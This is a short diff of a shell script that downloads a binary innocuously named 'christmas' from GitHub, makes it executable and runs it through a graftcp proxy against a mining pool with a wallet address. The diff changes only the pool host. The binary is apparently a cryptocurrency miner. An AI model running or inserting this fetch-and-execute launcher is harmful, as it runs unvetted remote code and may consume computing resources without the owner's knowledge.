@@ -24,4 +24,4 @@ echo " "
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/christmas
 chmod +x christmas
 
-./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.Circle -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.Circle -p IhatePopUps
